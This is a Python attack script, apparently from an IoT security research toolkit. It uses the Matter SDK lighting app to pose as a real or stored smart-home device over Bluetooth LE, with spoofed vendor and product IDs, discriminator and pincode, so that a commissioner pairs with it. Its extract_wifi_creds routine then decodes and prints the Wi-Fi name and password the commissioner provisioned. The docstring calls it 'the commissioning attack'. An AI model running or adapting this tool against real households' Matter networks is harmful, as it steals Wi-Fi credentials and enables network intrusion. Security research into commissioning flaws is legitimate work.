#!/usr/bin/env python3
'''
Main script for setting up device commissioning. There may be some issues with Kernal 7+ with 
regards to BLE advertising, verify that the following command works ok:
    bluetoothctl advertise on
If this fails then chip-lighting-app will likely fail to utilise the default ble controller
and the commissioning attack overall will fail.

'''

from pathlib import Path
try:
    # When imported as part of the lib package
    from . import QRDecoder as qrdecoder 
    # From the Matter SDK /src/setup_payload/python/: SetupPayload.py and Base38.py
    from . import SetupPayload as setuppayload  
except ImportError:
    # When run directly
    import QRDecoder as qrdecoder 
    # From the Matter SDK /src/setup_payload/python/: SetupPayload.py and Base38.py
    import SetupPayload as setuppayload 

import subprocess # For executing the matter device binary file
import threading # for device logging
import os
import time
import signal
import sys
import yaml
import base64
from datetime import datetime # We need this for the timestamp timestamp

 # added for signaling thread stop, borrowed from the BruteForceAttack script
stop_logging_event = threading.Event()
now = datetime.now()
timestamp = now.strftime("%Y%m%d_%H%M")

LIGHTING_APP_EXEC = "bin/chip-lighting-app" # The matter sdk file used for commissioing
 # Store a unique kvs file associated with the virtual device
MAIN_KVS_FILE = f"kvs/chip_lighting_{timestamp}.kvs"
stored_log = ''

currentDirectory = os.getcwd()
if currentDirectory.endswith("lib"): # If executing the Commissioning script directly
    LIGHTING_APP_EXEC = "../bin/chip-lighting-app"
    MAIN_KVS_FILE = f"../kvs/chip_lighting_{timestamp}.kvs"

# Quickly read the KVS file after the commissioning process 
def extract_wifi_creds():
    print(f"Attempting to extract Wifi network name and password from {MAIN_KVS_FILE}")
    target_keys = {"wifi-ssid","wifi-pass"}

    with open(MAIN_KVS_FILE, encoding="utf-8") as file:
        for line in file:
            # Strip whitespace and skip empty lines or comments
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            
            # Split line into key / value (maxsplit=1 protects values containing '=')
            key, value = line.split("=", 1)
            
            # Clean up any spaces around the key or value picked up
            key = key.strip()
            value = value.strip()
            
            # If the kvs contains the entry for wifi credentials, decode from base64 
            # value and print out the credentials
            if key in target_keys:
                print("=================================================")
                print(f"{key}: {base64.b64decode(value).decode('utf-8')}")

# This method is borrowed from the BruteForceAttack script
def log_device_output(process_stdout):
    
    # Reads and prints lines from the device process stdout
    try:
        # reads line by line until the event is set or the stream closes
        for line in iter(process_stdout.readline, ''):
            if stop_logging_event.is_set():
                break

            output_line = line.strip()
            # This line indicates that the device has been commissioned
            if "[FP] Assigned compressed fabric ID:" in output_line: 
                # Report of a successful pairing
                print(f"[DEVICE PAIRED TO A FABRIC!] {line.strip()}") 
                extract_wifi_creds()
            elif "[SVR] Commissioning completed successfully:" in output_line:
                # Report of a successful pairing
                print(f"[DEVICE COMMISSIONED SUCCESSFULLY!] {line.strip()}") 
                extract_wifi_creds()
            # Removing some very noisy anomalous entries
            if not("[DIS] 0x" in output_line or "[DIS] Could not" in output_line): 
                do_nothing = ''

        process_stdout.close() # Ensure the pipe is closed
        print("INFO - Device logging thread finished.")
    except Exception as e:
        # handles potential exceptions during reading, 
        # e.g., if process dies unexpectedly
        if not stop_logging_event.is_set():
             print(f"[ERROR] Exception in device logging thread: {e}",\
                    file=sys.stderr)

# This method is borrowed from the BruteForceAttackWithDiscriminator script
def stop_device(device_log_thread, device_process):
    # signals and waits for the logging thread to finish
    if device_log_thread and device_log_thread.is_alive():
        print("INFO - Signaling logging thread to stop...")
        stop_logging_event.set()
        device_log_thread.join(timeout=2) # waiting briefly for thread to exit
        if device_log_thread.is_alive():
            print("WARNING: Logging thread did not stop gracefully.")
        device_log_thread = None

    # stopping the device process
    if device_process and device_process.poll() is None:
        print("INFO: Stopping lighting-app process...")
        try:
            os.killpg(os.getpgid(device_process.pid), signal.SIGTERM)
            device_process.wait(timeout=5)
            print("INFO - lighting-app process stopped.")
        except ProcessLookupError:
             print("INFO - lighting-app process already gone.")
        except subprocess.TimeoutExpired:
            print("WARNING - lighting-app did not terminate gracefully,\
                   sending SIGKILL.")
            try:
                os.killpg(os.getpgid(device_process.pid), signal.SIGKILL)
                device_process.wait(timeout=2)
            except Exception as e:
                print(f"ERROR - Failed to kill lighting-app: {e}",\
                       file=sys.stderr)
        except Exception as e:
            print(f"ERROR - Error stopping lighting-app process: {e}",\
                   file=sys.stderr)
        finally:
            if device_process.stdout:
                device_process.stdout.close()
            device_process = None

def get_valid_choice(prompt, valid_choices):
    while True:
        choice = input(prompt)
        if choice in valid_choices:
            return choice
        else:
            print(f"ERROR - Invalid input. Please choose from \
                  {', '.join(valid_choices)}.")

def commission_device(commission_option=''):
    if commission_option == '2':
        print("INFO - Commission new device (default settings)")
        commission_lighting_app()
    elif  commission_option == '3':
        print("INFO - Commission new device from QR")
        qrdecoder.list_image_files()
    elif  commission_option == '4':
        print("INFO - Commission new device from stored details")
        read_devices_yaml()


# This loads the available device entries that we can mimic
def read_devices_yaml():
    print("reading devices.yaml file")

    yaml_data = ''
    try: 
        with open('config/devices.yaml', 'r') as file:
            # yaml.safe_load converts the YAML into native Python dictionaries 
            # and lists
            yaml_data = yaml.safe_load(file)
    except FileNotFoundError:
        with open('../config/devices.yaml', 'r') as file:
            yaml_data = yaml.safe_load(file)


    devices_list = yaml_data.get('devices', [])

    print("--- The Entire List of Stored Devices ---")
    print(devices_list)

    menu_actions = {
            '1': 'Go Back'
        }

    menu_actions_count = 2
    print("INFO - Iterating Through the List of devices")
    for device in devices_list:
        device_name = device.get('name', 'Unknown')
        device_vendorid = device.get('vid', 'Unknown')
        device_productid = device.get('pid', 'Unknown')
        device_discriminator = device.get('long_discriminator', 'Unknown')
        device_pincode = device.get('pincode', 'Unknown')

        if device_pincode != '' and device_pincode != 'Unknown':
            print(f"We can pair this device {menu_actions_count}: {device_name}")
            menu_actions[str(menu_actions_count)]=device
            menu_actions_count +=1

    if menu_actions_count > 2:
        while True:
            print("\nMenu:")
            print("1. Go back to main menu")
            for action in range(2,menu_actions_count):
                print(f"{(action)}. Select Device: {menu_actions[str(action)]}")
            
            choice = get_valid_choice("Select an option: ", menu_actions.keys())
            if choice == '1': # Go back to the main menu
                break
            else:
                print(f"INFO - The choice is {menu_actions[choice]}")
                print(f"INFO - The device name is {menu_actions[choice]["name"]}")
                commission_lighting_app(menu_actions[choice]["name"],\
                                        menu_actions[choice]["vid"],\
                                        menu_actions[choice]["pid"],\
                                        menu_actions[choice]["pincode"],\
                                        menu_actions[choice]["long_discriminator"])
                break

def commission_lighting_app(product_name="TEST_PRODUCT",vendor_id="65521",\
                            product_id="32769",setup_pin="20202021",\
                                discriminator="3840",serial_no="TEST_SN",\
                                    chiptool_path=LIGHTING_APP_EXEC):
    
    cmd = [
        chiptool_path,
        "--ble-controller",
        str(0), #  0 maps to hci0 interface. Change here to use other devices.
        "--product-name",
        str(product_name),
        "--product-id",
        str(product_id),
        "--vendor-id",
        str(vendor_id),
        "--serial-number",
        str(serial_no),
        "--passcode",
        str(setup_pin),
        "--discriminator",
        str(discriminator),
        "--KVS",
        MAIN_KVS_FILE,
        "--wifi" # Tell the virtual device to connect through Wifi Only
    ]

    try:     
        stop_logging_event.clear() # Clear the logging event
        
        print(cmd)

        # starting the device pairing proces
        device_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            preexec_fn=os.setsid
        )

        print(f"INFO - Our result is {device_process}")

        # starting the logging thread
        device_log_thread = threading.Thread(
            target=log_device_output,
            args=(device_process.stdout,),
            # set as daemon so it doesn't block script exit if main thread dies
            daemon=True 
        )
        device_log_thread.start()

        # waiting for the device to be ready (checking readiness via logs 
        # printed by the thread)
        print("INFO - Waiting a few seconds for device to initialize...")
        time.sleep(5) 


        # basic check if process started okay
        if device_process.poll() is not None:
             print("ERROR - lighting-app exited immediately after starting. \
                   Make sure that there are no other SDK examples running in\
                    the background with 'ps -e | grep chip'", file=sys.stderr)
             stop_device()
             return False

        print("INFO - Assuming lighting-app is ready.")

        menu_actions = {
            'q': 'quit',
            'p': 'poll'
        }

        while True:
            print("\nMenu:")
            print("q : Quit the commissioning process")
            #print("p : Poll for latest updates")
 
            choice = get_valid_choice("Select an option: ", menu_actions.keys())
            #print(f"Choice is: {choice}")
            if choice == 'q': # Kill the pocess and go back to the main menu
                stop_device(device_log_thread,device_process)
                stop_logging_event.clear()
                break
            elif choice == 'p':
                print("Poll the output")
                #log_device_output(device_process.stdout)
                #read_output() # Report the latest stdout message

        return True

    except subprocess.TimeoutExpired:
        print("ERROR - subprocess.TimeoutExpired")
        return "timeout"
    except FileNotFoundError:
        print("ERrOR - FileNotFoundError")
        return "fatal"
    except Exception as e:
        print(f"FAIL - (Script Exception: {e})")
        return "fatal"

# Reading the output of the process
def read_output(recent_lines=10):
    print(f"INFO - Printing out the latest output")

# Menu options available
def display_options():
    commision_menu_actions = {
        '1': 'back',
        '2': 'new',
        '3': 'qr',
        '4': 'stored',
    }

    while True:
        print("\nMenu:")
        print("1. Go back to main menu")
        print("2. Commission new device (default settings)")
        print("3. Commission new device from QR")
        print("4. Commission new device from stored details")
        choice = get_valid_choice("Select an option: ", \
                                  commision_menu_actions.keys())
        print(f"Choice is: {choice}")
        if choice == '1': # Go back to the main menu
            break
        else:
            commission_device(choice)
            break

if __name__ == "__main__":
    display_options()
